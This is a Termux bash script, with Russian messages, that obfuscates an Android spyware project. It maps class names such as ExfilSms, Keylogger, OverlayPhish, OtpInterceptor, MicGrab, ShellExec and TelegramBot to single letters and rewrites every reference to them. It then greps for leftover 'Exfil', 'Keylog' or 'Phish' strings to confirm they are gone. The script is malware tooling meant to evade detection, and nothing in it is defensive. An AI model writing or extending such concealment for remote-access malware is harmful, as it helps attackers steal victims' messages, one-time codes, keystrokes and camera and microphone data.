#!/data/data/com.termux/files/usr/bin/bash

if [ ! -f AndroidManifest.xml ]; then
  echo "Запусти из папки com.v2ram"
  exit 1
fi

echo "0) Удаляю старые .bak..."
rm -f *.bak
rm -f res/xml/*.bak res/values/*.bak

# Маппинг: реальное имя -> буква
declare -A MAP=(
  ["MainActivity"]="a"
  ["KeepAliveService"]="b"
  ["AccessibilityBridge"]="c"
  ["TelegramBot"]="d"
  ["CommandRouter"]="e"
  ["NotificationListener"]="f"
  ["UIAutomation"]="g"
  ["OverlayPhish"]="h"
  ["ScreenGrab"]="i"
  ["ExfilSms"]="j"
  ["ExfilContacts"]="k"
  ["ExfilCalls"]="l"
  ["ExfilFiles"]="m"
  ["ExfilGallery"]="n"
  ["LocationGrab"]="o"
  ["CameraGrab"]="p"
  ["MicGrab"]="q"
  ["Toaster"]="r"
  ["AppIndex"]="s"
  ["DeviceInfo"]="t"
  ["ShellExec"]="u"
  ["ClipboardGrab"]="v"
  ["ApkInstaller"]="w"
  ["Keylogger"]="x"
  ["AccountListener"]="y"
  ["BootReceiver"]="z"
  ["WatchdogReceiver"]="a1"
  ["NotificationControl"]="b1"
  ["Utils"]="c1"
  ["ScreenStream"]="d1"
  ["GpsTracker"]="e1"
  ["OtpInterceptor"]="f1"
  ["AutoShot"]="g1"
  ["BulkSms"]="h1"
  ["FakeScreen"]="i1"
)

echo "1) Переименовываю .java файлы в буквы..."
for old in "${!MAP[@]}"; do
  new="${MAP[$old]}"
  if [ -f "$old.java" ]; then
    mv "$old.java" "$new.java"
    echo "  $old.java -> $new.java"
  fi
done

echo "2) Меняю имена классов внутри .java и .xml..."
for old in "${!MAP[@]}"; do
  new="${MAP[$old]}"
  grep -rl "\b$old\b" . --include="*.java" --include="*.xml" 2>/dev/null \
    | xargs -r sed -i "s/\b$old\b/$new/g"
done

echo "3) Убираю .bak..."
rm -f *.bak
find . -name "*.bak" -delete

echo "4) Проверка остатков старых имён:"
grep -rn "Exfil\|Keylog\|Phish\|AccessibilityBridge\|TelegramBot\|OverlayPhish" . --include="*.java" --include="*.xml" | head -20
echo "(если пусто — чисто)"

echo "5) Финальный ls:"
ls *.java
